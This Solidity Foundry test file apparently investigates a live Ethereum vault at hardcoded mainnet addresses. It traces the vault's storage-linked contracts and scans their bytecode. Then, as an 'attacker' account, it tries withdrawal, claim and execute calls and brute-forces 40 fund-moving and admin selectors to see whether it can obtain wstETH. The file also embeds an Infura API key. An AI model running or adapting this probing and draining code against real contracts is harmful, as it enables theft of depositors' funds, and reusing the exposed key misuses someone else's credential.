// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

/**
 * DEEP CONTRACT CHAIN INVESTIGATION
 *
 * Tracing: VAULT -> Slot5 -> Slot5.Slot5 -> ???
 */
contract DeepContractChain is Test {
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;

    // Chain discovered so far
    address constant VAULT_SLOT5 = 0x97c03F52244E60BB18511Cbf03f890D5886f1F47;
    address constant SLOT5_SLOT5 = 0x89f57D3617F6a9FF877fEa34Dd0688b2840Ef50e;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_TraceFullContractChain() public {
        console.log("=== TRACE FULL CONTRACT CHAIN ===\n");

        // Start from VAULT
        console.log("Level 0: VAULT", VAULT);

        // VAULT slots
        address level1 = address(uint160(uint256(vm.load(VAULT, bytes32(uint256(5))))));
        console.log("Level 1: VAULT.slot5 =", level1);
        console.log("  Code size:", level1.code.length);

        // Level 1 slots
        address level2 = address(uint160(uint256(vm.load(level1, bytes32(uint256(5))))));
        console.log("Level 2: Level1.slot5 =", level2);
        console.log("  Code size:", level2.code.length);

        // Level 2 slots
        if (level2.code.length > 0) {
            for (uint i = 0; i < 10; i++) {
                bytes32 slot = vm.load(level2, bytes32(i));
                if (uint256(slot) != 0) {
                    address addr = address(uint160(uint256(slot)));
                    console.log("  Level2.slot%d:", i);
                    console.logBytes32(slot);
                    if (addr.code.length > 0) {
                        console.log("    -> Contract:", addr);
                    }
                }
            }
        }

        // Follow any chain further
        console.log("\n=== FULL STORAGE TRACE OF SLOT5_SLOT5 ===");
        address target = SLOT5_SLOT5;
        console.log("Target:", target);
        console.log("Code size:", target.code.length);

        for (uint i = 0; i < 20; i++) {
            bytes32 slot = vm.load(target, bytes32(i));
            if (uint256(slot) != 0) {
                console.log("Slot %d:", i);
                console.logBytes32(slot);
            }
        }
    }

    function test_AnalyzeSlot5Slot5Contract() public {
        console.log("=== ANALYZE SLOT5_SLOT5 CONTRACT ===\n");

        address target = SLOT5_SLOT5;
        console.log("Target:", target);
        console.log("Code size:", target.code.length);

        // Scan bytecode for interesting opcodes
        bytes memory code = target.code;

        uint delegatecallCount = 0;
        uint callCount = 0;
        uint sloadCount = 0;
        uint sstoreCount = 0;

        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xF4) delegatecallCount++;
            if (uint8(code[i]) == 0xF1) callCount++;
            if (uint8(code[i]) == 0x54) sloadCount++;
            if (uint8(code[i]) == 0x55) sstoreCount++;
        }

        console.log("Opcode analysis:");
        console.log("  DELEGATECALL:", delegatecallCount);
        console.log("  CALL:", callCount);
        console.log("  SLOAD:", sloadCount);
        console.log("  SSTORE:", sstoreCount);

        // Try common functions
        console.log("\nTrying functions:");

        (bool s1, bytes memory d1) = target.staticcall(abi.encodeWithSignature("owner()"));
        if (s1 && d1.length > 0) {
            console.log("owner():", abi.decode(d1, (address)));
        }

        (bool s2, bytes memory d2) = target.staticcall(abi.encodeWithSignature("vault()"));
        if (s2 && d2.length > 0) {
            console.log("vault():", abi.decode(d2, (address)));
        }

        (bool s3, bytes memory d3) = target.staticcall(abi.encodeWithSignature("asset()"));
        if (s3 && d3.length > 0) {
            console.log("asset():", abi.decode(d3, (address)));
        }

        (bool s4, bytes memory d4) = target.staticcall(abi.encodeWithSignature("controller()"));
        if (s4 && d4.length > 0) {
            console.log("controller():", abi.decode(d4, (address)));
        }

        (bool s5, bytes memory d5) = target.staticcall(abi.encodeWithSignature("redemption()"));
        if (s5 && d5.length > 0) {
            console.log("redemption():", abi.decode(d5, (address)));
        }
    }

    function test_ExploitSlot5Slot5() public {
        console.log("=== EXPLOIT SLOT5_SLOT5 ===\n");

        address target = SLOT5_SLOT5;

        // Try to call functions that might withdraw
        vm.startPrank(attacker);

        // Try withdraw variants
        (bool w1,) = target.call(abi.encodeWithSignature("withdraw(uint256)", 1000e18));
        console.log("withdraw(amount):", w1);

        (bool w2,) = target.call(abi.encodeWithSignature("withdraw(uint256,address)", 1000e18, attacker));
        console.log("withdraw(amount,to):", w2);

        (bool w3,) = target.call(abi.encodeWithSignature("redeem(uint256)", 1000e18));
        console.log("redeem(amount):", w3);

        (bool w4,) = target.call(abi.encodeWithSignature("claim()"));
        console.log("claim():", w4);

        (bool w5,) = target.call(abi.encodeWithSignature("claimRewards()"));
        console.log("claimRewards():", w5);

        // Try execute patterns
        (bool e1,) = target.call(abi.encodeWithSignature(
            "execute(address,uint256,bytes)",
            VAULT,
            0,
            abi.encodeWithSignature("transfer(address,uint256)", attacker, 1000e18)
        ));
        console.log("execute(VAULT,0,transfer):", e1);

        vm.stopPrank();

        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_VaultSlot5AllFunctions() public {
        console.log("=== VAULT SLOT5 ALL FUNCTIONS ===\n");

        address target = VAULT_SLOT5;

        // Brute force function selectors
        bytes4[] memory sigs = new bytes4[](40);
        sigs[0] = bytes4(keccak256("redeem(uint256)"));
        sigs[1] = bytes4(keccak256("redeem(uint256,address)"));
        sigs[2] = bytes4(keccak256("redeem(uint96)"));
        sigs[3] = bytes4(keccak256("withdraw(uint256)"));
        sigs[4] = bytes4(keccak256("withdraw(uint256,address)"));
        sigs[5] = bytes4(keccak256("claim()"));
        sigs[6] = bytes4(keccak256("claimRewards()"));
        sigs[7] = bytes4(keccak256("harvest()"));
        sigs[8] = bytes4(keccak256("collect()"));
        sigs[9] = bytes4(keccak256("execute(address,bytes)"));
        sigs[10] = bytes4(keccak256("execute(address,uint256,bytes)"));
        sigs[11] = bytes4(keccak256("call(address,bytes)"));
        sigs[12] = bytes4(keccak256("delegatecall(address,bytes)"));
        sigs[13] = bytes4(keccak256("multicall(bytes[])"));
        sigs[14] = bytes4(keccak256("batch(bytes[])"));
        sigs[15] = bytes4(keccak256("sweepToken(address)"));
        sigs[16] = bytes4(keccak256("sweep(address)"));
        sigs[17] = bytes4(keccak256("rescue(address)"));
        sigs[18] = bytes4(keccak256("emergencyWithdraw()"));
        sigs[19] = bytes4(keccak256("emergencyWithdraw(address)"));
        sigs[20] = bytes4(keccak256("withdrawAll()"));
        sigs[21] = bytes4(keccak256("withdrawAllTo(address)"));
        sigs[22] = bytes4(keccak256("getReward()"));
        sigs[23] = bytes4(keccak256("exit()"));
        sigs[24] = bytes4(keccak256("unstake(uint256)"));
        sigs[25] = bytes4(keccak256("unstakeAll()"));
        sigs[26] = bytes4(keccak256("requestWithdraw(uint256)"));
        sigs[27] = bytes4(keccak256("finalizeWithdraw()"));
        sigs[28] = bytes4(keccak256("processWithdraw()"));
        sigs[29] = bytes4(keccak256("completeWithdraw()"));
        sigs[30] = bytes4(keccak256("claimAll()"));
        sigs[31] = bytes4(keccak256("redeemAll()"));
        sigs[32] = bytes4(keccak256("transferOut(address,uint256)"));
        sigs[33] = bytes4(keccak256("send(address,uint256)"));
        sigs[34] = bytes4(keccak256("pull(address,uint256)"));
        sigs[35] = bytes4(keccak256("push(address,uint256)"));
        sigs[36] = bytes4(keccak256("setDelay(uint256)"));
        sigs[37] = bytes4(keccak256("setCooldown(uint256)"));
        sigs[38] = bytes4(keccak256("setMinimum(uint256)"));
        sigs[39] = bytes4(keccak256("skipDelay()"));

        vm.startPrank(attacker);

        console.log("Brute forcing functions...");
        for (uint i = 0; i < sigs.length; i++) {
            // Try with no args
            (bool s1,) = target.call(abi.encodeWithSelector(sigs[i]));
            if (s1) {
                console.log("Selector %d succeeded (no args):", i);
                console.logBytes4(sigs[i]);
            }

            // Try with attacker address
            (bool s2,) = target.call(abi.encodeWithSelector(sigs[i], attacker));
            if (s2) {
                console.log("Selector %d succeeded (with address):", i);
                console.logBytes4(sigs[i]);
            }

            // Try with amount
            (bool s3,) = target.call(abi.encodeWithSelector(sigs[i], 1000e18));
            if (s3) {
                console.log("Selector %d succeeded (with amount):", i);
                console.logBytes4(sigs[i]);
            }
        }

        vm.stopPrank();

        console.log("Attacker wstETH:", IERC20(wstETH).balanceOf(attacker) / 1e18);
    }

    function test_FindAllRelatedContracts() public {
        console.log("=== FIND ALL RELATED CONTRACTS ===\n");

        // Map out the entire contract ecosystem
        address[] memory toCheck = new address[](10);
        toCheck[0] = VAULT;
        toCheck[1] = VAULT_SLOT5;
        toCheck[2] = SLOT5_SLOT5;
        toCheck[3] = 0x1af329D2C4CeaF45E1D8062c696b09FfadDb933a; // VAULT.slot2
        toCheck[4] = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e; // Timelock
        toCheck[5] = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510; // RC
        toCheck[6] = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85; // R0
        toCheck[7] = 0x829525417Cd78CBa0f99A8736426fC299506C0d6; // R1
        toCheck[8] = TASSET;
        toCheck[9] = wstETH;

        for (uint c = 0; c < toCheck.length; c++) {
            address target = toCheck[c];
            if (target.code.length == 0) continue;

            console.log("\n=== Contract %d: %s ===", c, target);
            console.log("Code size:", target.code.length);

            // Check owner
            (bool so, bytes memory do_) = target.staticcall(abi.encodeWithSignature("owner()"));
            if (so && do_.length > 0) {
                console.log("Owner:", abi.decode(do_, (address)));
            }

            // List storage refs to other contracts
            uint foundRefs = 0;
            for (uint i = 0; i < 10 && foundRefs < 5; i++) {
                bytes32 slot = vm.load(target, bytes32(i));
                address ref = address(uint160(uint256(slot)));
                if (ref.code.length > 0) {
                    console.log("Slot %d -> %s", i, ref);
                    foundRefs++;
                }
            }
        }
    }
}
